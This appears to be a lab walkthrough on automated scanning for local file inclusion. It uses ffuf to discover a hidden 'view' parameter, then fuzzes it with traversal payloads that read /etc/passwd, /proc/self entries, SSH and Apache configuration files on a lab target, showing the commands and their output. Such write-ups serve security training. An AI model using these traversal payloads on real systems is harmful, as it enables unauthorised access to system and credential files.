# Automated Scanning

## Fuzzing Parameters

```sh
my@attack:~$ ffuf -ic -w /usr/local/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://94.237.63.109:50849/index.php?FUZZ=value" -fs 2309
```

```output title="Output"
view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 68ms]
```

## LFI Wordlists

```sh
my@attack:~$ ffuf -ic -w /usr/local/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://94.237.63.109:50849/index.php?view=FUZZ" -fs 1935
```

```output title="Output" hl_lines="6"
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 69ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 69ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 71ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 70ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 68ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 67ms]
```

## Fuzzing Server Files

### Server Web Root

```sh
my@attack:~$ ffuf -ic -w /usr/local/share/wordlists/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u "http://94.237.63.109:50849/index.php?view=../../../../../../../../../../../../../../../../../FUZZ/index.php"
```

```output title="Output"
var/www/html/           [Status: 200, Size: 351058655, Words: 72887806, Lines: 10211336, Duration: 183ms]
```

### Server Logs

!!! abstract

    * [LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
    * [LFI-WordList-Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)

```sh
my@attack:~$ ffuf -ic -w LFI-WordList-Linux:FUZZ -u "http://94.237.63.109:50849/index.php?view=../../../../../../../../../../../../../../../../../FUZZ" -fs 1935
```

```output title="Output" hl_lines="60"
/etc/adduser.conf       [Status: 200, Size: 4963, Words: 916, Lines: 144, Duration: 77ms]
/etc/bash.bashrc        [Status: 200, Size: 4254, Words: 913, Lines: 127, Duration: 68ms]
/etc/ca-certificates.conf [Status: 200, Size: 8468, Words: 578, Lines: 215, Duration: 68ms]
/etc/ca-certificates.conf.dpkg-old [Status: 200, Size: 7613, Words: 578, Lines: 194, Duration: 70ms]
/etc/debian_version     [Status: 200, Size: 1948, Words: 515, Lines: 57, Duration: 66ms]
/etc/debconf.conf       [Status: 200, Size: 4904, Words: 925, Lines: 139, Duration: 69ms]
/etc/deluser.conf       [Status: 200, Size: 2539, Words: 600, Lines: 76, Duration: 67ms]
/etc/fstab              [Status: 200, Size: 1972, Words: 520, Lines: 57, Duration: 70ms]
/etc/group              [Status: 200, Size: 2546, Words: 515, Lines: 104, Duration: 67ms]
/etc/group-             [Status: 200, Size: 2532, Words: 515, Lines: 103, Duration: 67ms]
/etc/host.conf          [Status: 200, Size: 2027, Words: 530, Lines: 59, Duration: 70ms]
/etc/hostname           [Status: 200, Size: 1976, Words: 515, Lines: 57, Duration: 70ms]
/etc/hosts              [Status: 200, Size: 2174, Words: 520, Lines: 64, Duration: 71ms]
/etc/hosts.allow        [Status: 200, Size: 2346, Words: 596, Lines: 66, Duration: 70ms]
/etc/hosts.deny         [Status: 200, Size: 2646, Words: 642, Lines: 73, Duration: 66ms]
/etc/issue              [Status: 200, Size: 1961, Words: 519, Lines: 58, Duration: 68ms]
/etc/issue.net          [Status: 200, Size: 1954, Words: 517, Lines: 57, Duration: 68ms]
/etc/ld.so.conf         [Status: 200, Size: 1969, Words: 516, Lines: 58, Duration: 68ms]
/etc/ldap/ldap.conf     [Status: 200, Size: 2267, Words: 537, Lines: 73, Duration: 69ms]
/etc/login.defs         [Status: 200, Size: 12485, Words: 2152, Lines: 397, Duration: 67ms]
/etc/mtab               [Status: 200, Size: 4760, Words: 625, Lines: 78, Duration: 69ms]
/etc/mysql/my.cnf       [Status: 200, Size: 2617, Words: 603, Lines: 77, Duration: 68ms]
/etc/networks           [Status: 200, Size: 2026, Words: 525, Lines: 58, Duration: 67ms]
/etc/os-release         [Status: 200, Size: 2317, Words: 520, Lines: 68, Duration: 68ms]
/etc/pam.conf           [Status: 200, Size: 2487, Words: 579, Lines: 71, Duration: 68ms]
/etc/passwd             [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 75ms]
/etc/passwd-            [Status: 200, Size: 3270, Words: 526, Lines: 81, Duration: 76ms]
/etc/profile            [Status: 200, Size: 2516, Words: 659, Lines: 83, Duration: 67ms]
/etc/resolv.conf        [Status: 200, Size: 2041, Words: 520, Lines: 59, Duration: 73ms]
/etc/security/access.conf [Status: 200, Size: 6499, Words: 1149, Lines: 178, Duration: 75ms]
/etc/security/group.conf [Status: 200, Size: 5570, Words: 1204, Lines: 162, Duration: 70ms]
/etc/security/limits.conf [Status: 200, Size: 4096, Words: 1261, Lines: 112, Duration: 68ms]
/etc/security/namespace.conf [Status: 200, Size: 3375, Words: 733, Lines: 84, Duration: 68ms]
/etc/security/pam_env.conf [Status: 200, Size: 4907, Words: 943, Lines: 129, Duration: 71ms]
/etc/security/sepermit.conf [Status: 200, Size: 2354, Words: 620, Lines: 67, Duration: 71ms]
/etc/security/time.conf [Status: 200, Size: 4114, Words: 856, Lines: 121, Duration: 74ms]
/etc/ssh/sshd_config    [Status: 200, Size: 5224, Words: 808, Lines: 179, Duration: 75ms]
/etc/sysctl.conf        [Status: 200, Size: 4286, Words: 764, Lines: 124, Duration: 68ms]
/etc/sysctl.d/10-console-messages.conf [Status: 200, Size: 2012, Words: 527, Lines: 59, Duration: 74ms]
/etc/sysctl.d/10-network-security.conf [Status: 200, Size: 2093, Words: 528, Lines: 62, Duration: 67ms]
/etc/timezone           [Status: 200, Size: 1949, Words: 515, Lines: 57, Duration: 72ms]
/proc/cpuinfo           [Status: 200, Size: 6623, Words: 1091, Lines: 168, Duration: 68ms]
/proc/devices           [Status: 200, Size: 2273, Words: 571, Lines: 89, Duration: 70ms]
/proc/meminfo           [Status: 200, Size: 3438, Words: 1028, Lines: 110, Duration: 68ms]
/proc/net/tcp           [Status: 200, Size: 2085, Words: 587, Lines: 57, Duration: 69ms]
/proc/net/udp           [Status: 200, Size: 2063, Words: 550, Lines: 57, Duration: 68ms]
/proc/self/cmdline      [Status: 200, Size: 1967, Words: 515, Lines: 56, Duration: 67ms]
/proc/self/mounts       [Status: 200, Size: 4760, Words: 625, Lines: 78, Duration: 67ms]
/proc/self/stat         [Status: 200, Size: 2247, Words: 566, Lines: 57, Duration: 66ms]
/proc/self/status       [Status: 200, Size: 3343, Words: 607, Lines: 113, Duration: 68ms]
/proc/version           [Status: 200, Size: 2123, Words: 535, Lines: 57, Duration: 67ms]
/etc/apache2/mods-available/setenvif.conf [Status: 200, Size: 3215, Words: 627, Lines: 88, Duration: 2631ms]
/etc/apache2/apache2.conf [Status: 200, Size: 9159, Words: 1456, Lines: 283, Duration: 2632ms]
/usr/share/adduser/adduser.conf [Status: 200, Size: 4963, Words: 916, Lines: 144, Duration: 73ms]
/etc/apache2/mods-enabled/mime.conf [Status: 200, Size: 9611, Words: 1457, Lines: 307, Duration: 3627ms]
/etc/apache2/mods-available/ssl.conf [Status: 200, Size: 5045, Words: 945, Lines: 141, Duration: 3630ms]
/etc/apache2/mods-enabled/deflate.conf [Status: 200, Size: 2330, Words: 537, Lines: 66, Duration: 3634ms]
/etc/apache2/mods-available/dir.conf [Status: 200, Size: 2092, Words: 529, Lines: 61, Duration: 4691ms]
/etc/apache2/ports.conf [Status: 200, Size: 2255, Words: 550, Lines: 71, Duration: 4703ms]
/etc/apache2/envvars    [Status: 200, Size: 3717, Words: 704, Lines: 103, Duration: 4703ms]
/etc/apache2/mods-available/deflate.conf [Status: 200, Size: 2330, Words: 537, Lines: 66, Duration: 4703ms]
/etc/apache2/mods-enabled/dir.conf [Status: 200, Size: 2092, Words: 529, Lines: 61, Duration: 4703ms]
/etc/apache2/mods-available/mime.conf [Status: 200, Size: 9611, Words: 1457, Lines: 307, Duration: 4703ms]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 2778, Words: 629, Lines: 80, Duration: 4703ms]
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 2684, Words: 596, Lines: 85, Duration: 4705ms]
/etc/apache2/mods-available/autoindex.conf [Status: 200, Size: 5309, Words: 827, Lines: 152, Duration: 4703ms]
/etc/apache2/mods-enabled/negotiation.conf [Status: 200, Size: 2659, Words: 623, Lines: 76, Duration: 5152ms]
/etc/apache2/mods-available/proxy.conf [Status: 200, Size: 2757, Words: 638, Lines: 83, Duration: 5166ms]
```
